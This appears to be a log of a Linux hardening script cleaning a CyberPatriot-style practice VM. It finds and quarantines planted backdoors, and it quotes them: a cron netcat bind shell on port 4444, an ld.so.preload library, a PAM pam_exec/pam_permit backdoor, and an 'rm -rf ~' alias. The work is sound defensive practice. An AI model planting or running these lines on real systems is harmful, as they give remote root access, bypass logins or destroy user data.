+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m quarantined /etc/lightdm/lightdm.conf.d/80-autologin.conf -> /root/cp-quarantine/etc/lightdm/lightdm.conf.d/80-autologin.conf   (undo: mv /root/cp-quarantine/etc/lightdm/lightdm.conf.d/80-autologin.conf /etc/lightdm/lightdm.conf.d/80-autologin.conf)
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 6/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/lightdm/lightdm.conf
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      [Seat:*]
+      autologin-user=bob
+      autologin-user-timeout=0
+      -> quarantine (q) unless the README needs it
+  lightdm.conf: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=skip] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+
+[1;36m--- 7/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/ld.so.preload - preloads: /usr/src/evil_rabbit.so
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+      preloads /usr/src/evil_rabbit.so  (no package owns it - quarantined together with this file)
+      -> quarantine (q) = this file + the unowned libraries it lists
+  ld.so.preload: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+ERROR: ld.so: object '/usr/src/evil_rabbit.so' from /etc/ld.so.preload cannot be preloaded (file too short): ignored.
+  [1;32m[+][0m quarantined preloaded library /usr/src/evil_rabbit.so -> /root/cp-quarantine/usr/src/evil_rabbit.so
+  [1;32m[+][0m quarantined /etc/ld.so.preload -> /root/cp-quarantine/etc/ld.so.preload   (undo: mv /root/cp-quarantine/etc/ld.so.preload /etc/ld.so.preload)
+
+[1;36m--- 8/19[0m  [1;31mFIX NOW[0m  [system]  file no package owns: 644 root:root /etc/cron.d/0hourly-sync
+      * * * * * root /bin/nc.traditional -l -p 4444 -e /bin/bash >/dev/null 2>&1
+      -> quarantine (q) unless the README needs it
+  0hourly-sync: d=show  q=quarantine  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+  [1;32m[+][0m quarantined /etc/cron.d/0hourly-sync -> /root/cp-quarantine/etc/cron.d/0hourly-sync   (undo: mv /root/cp-quarantine/etc/cron.d/0hourly-sync /etc/cron.d/0hourly-sync)
+
+[1;36m--- 9/19[0m  [1;31mFIX NOW[0m  [system]  unit file no package owns: /etc/systemd/system/system-sync.service
+      ExecStart=/usr/bin/python3 -m http.server 31337 --directory /
+      -> quarantine (q) = stop + disable + move, unless the README needs it
+  system-sync.service: d=show  q=quarantine (stop+disable+move)  e=edit  s=skip  x=exit  [Enter=quarantine] > 
+  [1;32m[+][0m stopped + disabled system-sync.service
+  [1;32m[+][0m quarantined /etc/systemd/system/system-sync.service -> /root/cp-quarantine/etc/systemd/system/system-sync.service   (undo: mv /root/cp-quarantine/etc/systemd/system/system-sync.service /etc/systemd/system/system-sync.service)
+
+[1;36m--- 11/19[0m  [1;31mFIX NOW[0m  [system]  unexpected listener: tcp 0.0.0.0:4444  nc.traditional (pid 431)
+      cmd: /bin/nc.traditional -l -p 4444 -e /bin/bash 
+      unit: cron.service
+      -> kill/stop it (k) unless the README needs it; also check cron + units
+  pid 431: d=show  k=kill/stop  s=skip  x=exit  [Enter=kill] > k
+  kill pid 431 (/bin/nc.traditional -l -p 4444 -e /bin/bash )? [Y/n] y
+  [1;32m[+][0m killed 431 - if it comes back, find what starts it (cron, unit, rc.local)
+
+[1;36m--- 12/19[0m  [1;31mFIX NOW[0m  [system]  unexpected listener: tcp 0.0.0.0:23  inetd (pid 264)
+      cmd: /usr/sbin/inetd 
+      unit: inetd.service
+      -> kill/stop it (k) unless the README needs it; also check cron + units
+  pid 264: d=show  k=kill/stop  s=skip  x=exit  [Enter=skip] > k
+  stop + disable inetd.service (pid 264: /usr/sbin/inetd )? [y/N] y
+  [1;32m[+][0m stopped + disabled inetd.service (undo: systemctl enable --now inetd.service)
+
+  REVIEW = config/perms that differ from the default. The hardening scripts fix most of these later.
+  Also go through the 7 REVIEW item(s)? [y/N] y
+
+[1;36m--- 13/19[0m  [1;33mREVIEW[0m  [ssh]  /etc/ssh/sshd_config differs from pristine (2 line(s))
+      + PermitRootLogin yes
+      + PermitEmptyPasswords yes
+      -> restore (r) or edit (e); ssh.sh hardens it
+  sshd_config: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  /etc/ssh/sshd_config can hold README-required settings (users, shares, ports, sites, zones). Restore the default anyway? [y/N] y
+  [1;32m[+][0m ssh.service restarted and active
+  [1;32m[+][0m restored default content of /etc/ssh/sshd_config  (backup: /root/cp-backups/20261111_030055/etc/ssh/sshd_config)
+
+[1;36m--- 14/19[0m  [1;33mREVIEW[0m  [ssh]  config file not owned by root: 644 bob:root /etc/ssh/sshd_config  (clean VM: 644 root:root)
+      -> fix (f) -> 644 root:root; ssh.sh hardens it
+      (changed since the scan - e.g. by a hardening script; default is skip)
+  sshd_config: d=show  f=fix -> 644 root:root  s=skip  x=exit  [Enter=skip] > f
+  [1;32m[+][0m /etc/ssh/sshd_config is now 644 root:root   (undo: /root/cp-backups/20261111_030055/PERMS-UNDO.sh)
+
+[1;36m--- 15/19[0m  [1;33mREVIEW[0m  [system]  /etc/sudoers differs from pristine (2 line(s))
+      + Defaults !env_reset
+      + Defaults env_keep += "PATH"
+      -> restore (r) or edit (e); usersandsudo.sh checks sudoers
+  sudoers: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  [1;32m[+][0m restored default content of /etc/sudoers  (backup: /root/cp-backups/20261111_030055/etc/sudoers)
+
+[1;36m--- 16/19[0m  [1;33mREVIEW[0m  [system]  /etc/sysctl.conf differs from pristine (7 line(s))
+      + net.ipv4.tcp_syncookies=0
+      + net.ipv4.ip_forward=1
+      + net.ipv4.conf.all.accept_source_route = 1
+      + net.ipv4.conf.all.send_redirects=1
+      + net.ipv4.conf.all.accept_redirects = 1
+      + kernel.randomize_va_space=0
+      ... 1 more (full diff: --review d, or diff.patch)
+      -> restore (r) or edit (e); systemconfig.sh also hardens this
+  sysctl.conf: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  [1;32m[+][0m restored default content of /etc/sysctl.conf  (backup: /root/cp-backups/20261111_030055/etc/sysctl.conf)
+
+[1;36m--- 17/19[0m  [1;33mREVIEW[0m  [system]  /etc/login.defs changed since install (login) - no pristine copy to compare
+      -> open it (e) and check every setting; systemconfig.sh also hardens this
+  login.defs: d=show  e=edit  s=skip  x=exit  [Enter=skip] > 
+
+[1;36m--- 18/19[0m  [1;33mREVIEW[0m  [system]  /etc/bash.bashrc differs from pristine (1 line(s))
+      + alias GOODBYE='rm -rf ~'
+      -> restore (r) or edit (e); systemconfig.sh also hardens this
+  bash.bashrc: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  [1;32m[+][0m restored default content of /etc/bash.bashrc  (backup: /root/cp-backups/20261111_030055/etc/bash.bashrc)
+
+[1;36m--- 19/19[0m  [1;33mREVIEW[0m  [system]  /etc/pam.d/common-auth differs from pristine (3 line(s))
+      + auth sufficient pam_exec.so expose_authtok quiet /lib/x86_64-linux-gnu/security/pam-bd
+      - auth requisite   pam_deny.so
+      + auth requisite   pam_permit.so
+      -> restore (r) or edit (e); systemconfig.sh also hardens this
+  common-auth: d=diff  r=restore default  e=edit  s=skip  x=exit  [Enter=skip] > r
+  [1;32m[+][0m restored default content of /etc/pam.d/common-auth  (backup: /root/cp-backups/20261111_030055/etc/pam.d/common-auth)
+
+  [1;32m[+][0m Triage done: 15 changed, 3 skipped, 1 already resolved.
+  Backups: /root/cp-backups/20261111_030055   Quarantine: /root/cp-quarantine/INDEX.txt
+  Re-scan to confirm: sudo bash services/baseline.sh 
+
+  [1;32m[+][0m Baseline review done in 59s. Full output: /root/cp-state/logs/review.log
+
+[1;36m======== CP19 start.sh ========[0m  1m10s since start | auto mode ON
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+  Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [1;32m[x][0m Baseline review                 59s
+   4 [ ] Users + sudo                    
+   5 [ ] System config                   
+   6 [ ] Packages + files                
+   7 [ ] Ports                           
+   8 [ ] Critical services               [ssh]
+   9 [ ] Upgrades (install downloaded)   (0 files downloaded)
+  10 [ ] LATE MANUAL list                
+  11 [ ] Final TODO list                 (0 open)
+  Enter = 4 Users + sudo | 1-11 = that step | t = TODO (0) | a = auto on/off | q = quit
+> 
+  ? Have you taken a screenshot of the score (shows which script cost points)? [Y/n]: y
+
+[1;36m=== Step: Users + sudo  (usersandsudo.sh)   log: /root/cp-state/logs/users.log ===[0m
+
+[1;36m=== Users and sudo ===[0m
+  [*] README: admins: cpuser alice | users: bob carol dave frank | you: cpuser   (wrong? sudo bash readme.sh --reset)
+
+[1;36m=== UID 0 accounts ===[0m
+  [1;33m[!][0m CRITICAL: toor has UID 0 (a second root account)
+  ? Delete account toor (recommended unless the README names it)? [Y/n]: y
+  [*] Backup: /root/cp-backups/20261111_030159/etc/passwd
+  [*] Backup: /root/cp-backups/20261111_030159/etc/shadow
+  [*] Backup: /root/cp-backups/20261111_030159/etc/group
+  [*] Backup: /root/cp-backups/20261111_030159/etc/gshadow
+  [1;32m[+][0m Deleted toor (backup: /root/cp-backups/20261111_030159)
+
+[1;36m=== Accounts not in the README ===[0m
+  [1;33m[!][0m Not in the README (3):
+        eve          UID 1006   
+        mallory      UID 1007   [in sudo] 
+        sysbackup    UID 998    hidden: system-range UID, home /home/sysbackup
+  ? Delete these 3 accounts (homes are backed up)? y = all, n = none, e = ask each [y]: y
+  [1;32m[+][0m Deleted eve (home backed up to /root/cp-backups/20261111_030159/homes/eve.tgz)
+  [1;32m[+][0m Deleted mallory (home backed up to /root/cp-backups/20261111_030159/homes/mallory.tgz)
+  [1;32m[+][0m Deleted sysbackup (home backed up to /root/cp-backups/20261111_030159/homes/sysbackup.tgz)
+  [*] System accounts with a login shell: syslog (systemconfig.sh sets nologin; postgres is left alone)
+
+[1;36m=== Admin rights (exact groups sudo/admin/wheel/adm - lpadmin is not one) ===[0m
+        + alice        add to sudo        (README admin; groups now: alice lpadmin)
+        - bob          remove from adm sudo (README standard user)
+  ? Apply these 2 admin-group fixes? y = all, n = none, e = ask each [y]: y
+  [1;32m[+][0m alice added to sudo
+  [1;32m[+][0m bob removed from adm sudo
+
+[1;36m=== Passwords ===[0m
+  [1;33m[!][0m EMPTY password (anyone can log in): carol
+  [*] README passwords are often weak and 'insecure password' fixes are commonly scored.
+  ? Set ONE new strong password for the 5 README users except you (alice bob carol dave frank)? [Y/n]: y
+  Type it twice (12+ characters with upper, lower, digit and symbol; Enter alone = cancel).
+  ? New password: 
+  ? Retype new password: 
+  [1;32m[+][0m New password set for: alice bob carol dave frank
+  [1;31m[TODO][0m WRITE DOWN the new password you set for: alice bob carol dave frank
+  [1;32m[+][0m No empty passwords left
+
+[1;36m=== Password aging and home folders ===[0m
+  [*] (auto) Password aging 30/7/14 + forced password change at next login for 5 users (not you)? -> yes
+  [1;32m[+][0m Aging 30/7/14 and change-at-next-login set for: alice bob carol dave frank
+  [*] (auto) Home folders: mode 750, owned by their user (6 folders)? -> yes
+  [1;32m[+][0m 750 + owner set on 6 home folders
+
+[1;36m=== Groups the README asks for ===[0m
+  ? README groups, as "group: member member" ("; " between groups, Enter = none): 
+  [*] None
+
+[1;36m=== sudoers: NOPASSWD / !authenticate, sudo rights for non-admins ===[0m
+  [*] Stock Linux Mint NOPASSWD lines in /etc/sudoers.d/mintupdate - leave them
+  [1;32m[+][0m No NOPASSWD / !authenticate (other than Mint stock) and only admins have sudo rights
+
+[1;36m=== Re-check ===[0m
+  [1;32m[+][0m Accounts, admin groups and UID 0 match the README
+
+=== usersandsudo.sh done ===
+
+  [1;32m[+][0m Users + sudo done in 19s - 1 new TODO item(s), t lists them. Full output: /root/cp-state/logs/users.log
+
+[1;36m======== CP19 start.sh ========[0m  1m34s since start | auto mode ON
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+  Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [1;32m[x][0m Baseline review                 59s
+   4 [1;32m[x][0m Users + sudo                    19s
+   5 [ ] System config                   
+   6 [ ] Packages + files                
+   7 [ ] Ports                           
+   8 [ ] Critical services               [ssh]
+   9 [ ] Upgrades (install downloaded)   (0 files downloaded)
+  10 [ ] LATE MANUAL list                
+  11 [ ] Final TODO list                 (1 open)
+  Enter = 5 System config | 1-11 = that step | t = TODO (1) | a = auto on/off | q = quit
+> 
+  ? Have you taken a screenshot of the score (shows which script cost points)? [Y/n]: y
+
+[1;36m=== Step: System config  (systemconfig.sh)   log: /root/cp-state/logs/system.log ===[0m
+Starting system hardening...
+  [*] README critical services: ssh
+
+[1;36m=== SYS10 /etc/ld.so.preload ===[0m
+  [*] baseline --review already quarantined ld.so.preload (/root/cp-quarantine/etc/ld.so.preload) - checking the libraries it listed
+
+[1;36m=== Firewall (UFW) ===[0m
+  [1;32m[+][0m UFW: allowed profile 'OpenSSH'
+  ? Extra ports the README needs (e.g. 8080/tcp, space separated), Enter = none: 
+  [1;32m[+][0m UFW enabled: deny incoming, allow outgoing, logging high
+        Status: active
+        OpenSSH                    ALLOW       Anywhere                  
+  [*] firewall done (4s)
+
+[1;36m=== LightDM (guest / autologin) ===[0m
+  [1;32m[+][0m LightDM: no guest, no autologin, users hidden, manual login, no X over TCP
+
+[1;36m=== UMASK, login.defs ===[0m
+  [1;32m[+][0m login.defs: UMASK 027, SHA512, LOGIN_RETRIES 3, PASS_MAX/MIN/WARN 30/7/14
+  [1;32m[+][0m /etc/profile: umask 027
+
+[1;36m=== Kernel parameters (sysctl) ===[0m
+  [1;32m[+][0m 44 parameters set in place in /etc/sysctl.conf
+  ? Disable IPv6 (scored on some images; n = keep it, hardened)? [Y/n]: y
+  [1;32m[+][0m IPv6 disabled
+  [1;32m[+][0m Applied (sysctl --system: same order as at boot)
+
+[1;36m=== SYS3 PAM backdoors ===[0m
+  [1;32m[+][0m pam_deny present, no pam_exec lines
+
+[1;36m=== SYS4 sudo.conf / sudoers defaults ===[0m
+  [1;32m[+][0m sudo.conf: Set disable_coredump true;Set probe_interfaces false;Set developer_mode false;
+  [1;32m[+][0m sudoers valid (use_pty, logfile=/var/log/sudo.log)
+  [1;32m[+][0m limits.conf: * hard core 0, * hard nproc 2500
+
+[1;36m=== SYS9 permissions, root, system accounts ===[0m
+  [1;32m[+][0m /etc/shadow + gshadow 640 root:shadow, /etc/passwd + group 644 root:root
+  [*] (auto) Lock the root account (passwd -l root)? You keep using sudo -> yes
+  [1;32m[+][0m root locked
+  [1;32m[+][0m /home -> 755 root:root
+  [1;32m[+][0m /swapfile -> 600
+  [1;33m[!][0m Groups with a group password in /etc/gshadow: root 
+  [*] (auto) Remove these group passwords? -> yes
+  [1;32m[+][0m Group passwords removed
+  [1;33m[!][0m System accounts with a login shell: syslog(/bin/bash) 
+  [*] (auto) Set their shell to /usr/sbin/nologin? -> yes
+  [1;32m[+][0m syslog -> nologin
+  [1;33m[!][0m System accounts with a password hash: bin
+  [*] (auto) Remove their passwords (set to '*')? -> yes
+  [1;32m[+][0m bin password removed
+  [1;33m[!][0m SUID/SGID on: /usr/bin/cp(-rwsr-xr-x) 
+  [*] (auto) Remove SUID/SGID from these binaries (never set on stock)? -> yes
+  [1;32m[+][0m Fixed /usr/bin/cp
+  [1;33m[!][0m Extended ACLs on system files:
+        /usr/bin/sudo: user:bob:rwx  
+  [*] (auto) Strip these ACLs (setfacl -b; stock has none)? -> yes
+  [1;32m[+][0m ACLs removed from system files
+
+[1;36m=== SYS10 persistence spots ===[0m
+  [1;31m[TODO][0m Review /etc/hosts entries (hijack?): 172.17.0.2 mint-cptest;
+  [*] apt holds: john (fileandpackage.sh unholds what it removes and lists the rest as TODO)
+  [*] APT sources: linuxmint - sources.list left alone (the Debian rewrite is for Debian images only)
+
+[1;36m=== Packages + automatic updates ===[0m
+  [*] (auto) Install libpam-pwquality auditd (needed for automatic updates, the password rules, auditd)? -> yes
+  [*] apt-get install libpam-pwquality auditd - waits for any background apt job (log: /root/cp-state/apt-systemconfig.log)
+  [1;32m[+][0m apt done (4s): libpam-pwquality auditd installed
+  [1;32m[+][0m Automatic updates: daily package list update + unattended-upgrade (20auto-upgrades)
+  [*] (auto) Linux Mint: turn on Update Manager automatic updates + automatic removal of old kernels (same as the GUI Automation tab)? -> yes
+  [1;32m[+][0m Mint automatic updates enabled
+  [1;32m[+][0m Update Manager: refresh the list of updates automatically (for cpuser)
+  [1;32m[+][0m common-password: pam_unix remember=5 minlen=12; pam_pwquality retry=3 minlen=12 dictcheck/usercheck/credits
+  [1;32m[+][0m pwquality.conf: minlen 12, 1 upper/lower/digit/other, dictcheck, usercheck
+  [1;32m[+][0m apparmor enabled and running
+  [1;33m[!][0m could not enable auditd
+  [1;32m[+][0m ufw enabled and running
+  [1;32m[+][0m unattended-upgrades enabled and running
+
+  [1;32m[+][0m System hardening complete in 15s. Backups: /root/cp-backups/20261111_030223/
+
+  [1;32m[+][0m System config done in 15s - 1 new TODO item(s), t lists them. Full output: /root/cp-state/logs/system.log
+
+[1;36m======== CP19 start.sh ========[0m  1m54s since start | auto mode ON
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+  Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [1;32m[x][0m Baseline review                 59s
+   4 [1;32m[x][0m Users + sudo                    19s
+   5 [1;32m[x][0m System config                   15s
+   6 [ ] Packages + files                
+   7 [ ] Ports                           
+   8 [ ] Critical services               [ssh]
+   9 [ ] Upgrades (install downloaded)   (0 files downloaded)
+  10 [ ] LATE MANUAL list                
+  11 [ ] Final TODO list                 (2 open)
+  Enter = 6 Packages + files | 1-11 = that step | t = TODO (2) | a = auto on/off | q = quit
+> 
+  ? Have you taken a screenshot of the score (shows which script cost points)? [Y/n]: y
+
+[1;36m=== Step: Packages + files  (fileandpackage.sh)   log: /root/cp-state/logs/packages.log ===[0m
+File, Package, and SUID/GUID Scanner
+  [*] README critical services: ssh
+
+[1;36m=== [0] Package tool sanity (can apt/dpkg be trusted on this image?) ===[0m
+  [*] 'apt' at /usr/local/bin/apt is from package mintsystem (Linux Mint's apt wrapper is normal) - unmodified
+  [1;33m[!][0m Packages on HOLD (unheld automatically if you remove them): john
+  [1;32m[+][0m apt/dpkg binaries, diversions, aliases and APT hooks look normal
+
+[1;36m=== [1] Unauthorized packages (dpkg-query, whole package names) ===[0m
+
+[1;36m=== [2] Build the removal list ===[0m
+  [1;32m[+][0m Kept - README critical service: OpenSSH server (openssh-server openssh-sftp-server); 
+  Hacking tools, remote access, P2P, games, services the README does not list:
+    [TOOL   ] john: john (HELD) john-data
+    [TOOL   ] hydra: hydra
+    [TOOL   ] nmap: nmap nmap-common
+    [TOOL   ] wireshark: libwireshark-data libwireshark15:amd64 libwiretap12:amd64 libwsutil13:amd64 tshark wireshark wireshark-common wireshark-qt
+    [TOOL   ] netcat: netcat-openbsd netcat-traditional
+    [TOOL   ] password crackers: ophcrack
+    [TOOL   ] wireless attack: aircrack-ng
+    [REMOTE ] telnet/rsh/finger: telnet telnetd
+    [REMOTE ] inetd/tftp/NIS: openbsd-inetd
+    [P2P    ] P2P/torrent: transmission-common transmission-gtk
+    [GAME   ] minetest/luanti: minetest minetest-data
+    [SERVICE] apache2: apache2 apache2-bin apache2-data apache2-utils
+    [SERVICE] FTP servers: vsftpd
+  ? Remove all of these (e = choose per family)? [Y/n/e]: y
+  Review - usually kept (desktop defaults, tools that ship with Ubuntu, needed by a critical website):
+    [DESKTOP] CUPS printing: cups cups-browsed cups-bsd cups-client cups-daemon
+              note: desktop default - [3] disables the service instead (scored as "disabled or removed")
+    [DESKTOP] avahi: avahi-daemon avahi-utils
+              note: desktop default - [3] disables the service instead
+    [REVIEW ] misc review: ftp tcpdump tnftp
+              note: tcpdump/ftp ship with Ubuntu
+  ? Remove these too? [y/N/e]: n
+  ? Other packages to remove (names/globs, ?word = search), Enter = none: 
+
+[1;36m=== Removal preview (apt-get -s purge) ===[0m
+  Your list (29): john john-data hydra nmap nmap-common libwireshark-data libwireshark15:amd64 
+libwiretap12:amd64 libwsutil13:amd64 tshark wireshark wireshark-common wireshark-qt netcat-openbsd 
+netcat-traditional ophcrack aircrack-ng telnet telnetd openbsd-inetd transmission-common transmission-gtk 
+minetest minetest-data apache2 apache2-bin apache2-data apache2-utils vsftpd
+  [1;32m[+][0m Nothing else would be removed.
+  [*] (auto) Purge these 29 package(s) (no desktop/critical package among them)? -> yes
+  [*] Unheld john
+  [*] apt-get purge 29 package(s) (waits for any background apt job; log: /root/cp-state/apt-purge.log)
+  [*] purge took 9s
+  [1;32m[+][0m dpkg-query: 29 of 29 packages gone
+
+[1;36m=== apt-get autoremove --purge (dependencies nothing needs any more) ===[0m
+  Would remove 73:
+        ethtool firebird3.0-common firebird3.0-common-doc hwloc ieee-data iw libapr1 libaprutil1 
+        libaprutil1-dbd-sqlite3 libaprutil1-ldap libbcg729-0 libbson-1.0-0 libc-ares2 libdouble-conversion3 
+        libfbclient2 libfreerdp2-2 libhwloc-plugins libhwloc15 libirrlicht1.8 libiw30 libjsoncpp25 
+        libleveldb1d liblinear4 liblua5.3-0 libluajit-5.1-2 libluajit-5.1-common libmd4c0 libmemcached11 
+        libminizip1 libmongoc-1.0-0 libmongocrypt0 libmysqlclient21 libnl-3-200 libnl-genl-3-200 
+        libnl-route-3-200 libpcre2-16-0 libpq5 libqt5charts5 libqt5core5a libqt5dbus5 libqt5gui5 
+        libqt5multimedia5 libqt5multimedia5-plugins libqt5multimediagsttools5 libqt5multimediawidgets5 
+        libqt5network5 libqt5printsupport5 libqt5svg5 libqt5widgets5 libsbc1 libserf-1-1 libsmi2ldbl 
+        libspandsp2 libspatialindex6 libspeexdsp1 libsvn1 libtommath1 libutf8proc2 libwinpr2-2 
+        libxcb-icccm4 libxcb-image0 libxcb-keysyms1 libxcb-render-util0 libxcb-xinerama0 libxcb-xinput0 
+        libxnvctrl0 lua-lpeg mysql-common qt5-gtk-platformtheme qttranslations5-l10n rfkill tcpd 
+        wireless-tools
+  [*] (auto) Run autoremove (73 unused dependencies, no desktop/critical package)? -> yes
+  [1;32m[+][0m autoremove done
+
+[1;36m=== Re-scan after removal ===[0m
+  [*] Kept: cups cups-browsed cups-bsd cups-client cups-daemon avahi-daemon avahi-utils ftp tcpdump tnftp 
+
+[1;36m=== [3] Unauthorized services (exact unit names) ===[0m
+  [1;32m[+][0m Kept - README critical service: ssh 
+  Not README critical services: avahi-daemon (active) cups (active) cups-browsed (active)
+  ? Stop + disable these 3 service(s)? [Y/n/e]: 
+  [1;32m[+][0m avahi-daemon stopped and disabled
+  [1;32m[+][0m cups stopped and disabled
+  [1;32m[+][0m cups-browsed stopped and disabled
+
+[1;36m=== [4] Mounted network shares ===[0m
+  [1;32m[+][0m No mounted network shares
+
+[1;36m=== [5] Unauthorized files  +  [6] SUID/SGID/sticky (one pass over the filesystem) ===[0m
+  [*] filesystem pass took 1s
+  Media files in user/data folders (3) - usually scored:
+    /home/bob/Music/never_gonna.mp3
+    /home/carol/Videos/movie.mp4
+    /home/dave/.local/share/.cache/stash.ogg
+  Media/archives in system folders that NO package installed (1) - planted:
+    /usr/share/fonts/truetype/.x/track01.mp3
+  Other files in user/data folders (5: archives, scripts, documents, images) - first 25, full list /root/cp-state/files-other.txt:
+    /home/bob/passwords.txt
+    /root/harness/checks_cp.py
+    /root/harness/drive2.py
+    /root/harness/mintchecks.py
+    /root/harness/svccheck.sh
+  ? Delete these 4 media file(s) (moved to /root/cp-quarantine, restorable)? [Y/n/e]: y
+  [1;32m[+][0m Moved /home/bob/Music/never_gonna.mp3 -> /root/cp-quarantine/home/bob/Music/never_gonna.mp3
+  [1;32m[+][0m Moved /home/carol/Videos/movie.mp4 -> /root/cp-quarantine/home/carol/Videos/movie.mp4
+  [1;32m[+][0m Moved /home/dave/.local/share/.cache/stash.ogg -> /root/cp-quarantine/home/dave/.local/share/.cache/stash.ogg
+  [1;32m[+][0m Moved /usr/share/fonts/truetype/.x/track01.mp3 -> /root/cp-quarantine/usr/share/fonts/truetype/.x/track01.mp3
+  [1;31m[TODO][0m Plaintext password file? /home/bob/passwords.txt - delete it if the README doesn't need it
+  [1;31m[TODO][0m Glance over 5 other files in user folders: /root/cp-state/files-other.txt (archives, scripts, documents)
+  [*] 22 SUID/SGID/sticky files (full list: /root/cp-state/files-suid-sgid.txt); stock helpers not shown
+  [1;32m[+][0m Only stock SUID/SGID helpers found
+
+  [1;32m[+][0m fileandpackage done in 34s. Quarantined files: /root/cp-quarantine (restore: mv /root/cp-quarantine/<path> /<path>)
+
+  [1;32m[+][0m Packages + files done in 34s - 2 new TODO item(s), t lists them. Full output: /root/cp-state/logs/packages.log
+
+[1;36m======== CP19 start.sh ========[0m  2m33s since start | auto mode ON
+  README: admins cpuser alice | users bob carol dave frank | critical services ssh
+  Background: apt: [1;32mdone[0m 12s, 0 upgrade files ready | baseline scan: [1;32mdone[0m 3s, FIX NOW 2, REVIEW 1 (list: /root/baseline/FINDINGS.txt)
+   1 [1;32m[x][0m README intake                   0s
+   2 [1;32m[x][0m Forensics + EARLY MANUAL list   3s
+   3 [1;32m[x][0m Baseline review                 59s
+   4 [1;32m[x][0m Users + sudo                    19s
+   5 [1;32m[x][0m System config                   15s
+   6 [1;32m[x][0m Packages + files                34s
+   7 [ ] Ports                           
+   8 [ ] Critical services               [ssh]
+   9 [ ] Upgrades (install downloaded)   (0 files downloaded)
+  10 [ ] LATE MANUAL list                
+  11 [ ] Final TODO list                 (4 open)
+  Enter = 7 Ports | 1-11 = that step | t = TODO (4) | a = auto on/off | q = quit
+> 
+  ? Have you taken a screenshot of the score (shows which script cost points)? [Y/n]: y
+
+[1;36m=== Step: Ports  (portandmisc.sh)   log: /root/cp-state/logs/ports.log ===[0m
+
+[1;36m=== Listening ports (process, package, unit) ===[0m
+  PROTO ADDRESS:PORT           PROCESS (PID)                PACKAGE                UNIT  -> verdict
+  tcp   0.0.0.0:22             sshd (3083)                  openssh-server         ssh.service  -> critical
+  tcp   127.0.0.53%lo:53       systemd-resolve (67)         systemd                systemd-resolved.service  -> system
+  udp   127.0.0.53%lo:53       systemd-resolve (67)         systemd                systemd-resolved.service  -> system
+  tcp   0.0.0.0:4444           nc.traditional (2846)        (no package)           cron.service  -> backdoor
+          cmd: /bin/nc.traditional -l -p 4444 -e /bin/bash    unit file: /lib/systemd/system/cron.service
+
+  [*] 3 listener(s) are critical services, stock system daemons or the scoring engine
+  ? Stop + disable these backdoor-looking listeners: tcp/4444(cron.service) ? [Y/n/e]: y
+  [1;32m[+][0m killed pid 2846 (tcp/4444: /bin/nc.traditional -l -p 4444 -e /bin/bash )
+  [1;31m[TODO][0m Find what started '/bin/nc.traditional -l -p 4444 -e /bin/bash ' (tcp/4444, was in cron.service) - cron job, rc.local, user crontab, profile? - and remove it
+  [1;32m[+][0m tcp/4444 closed
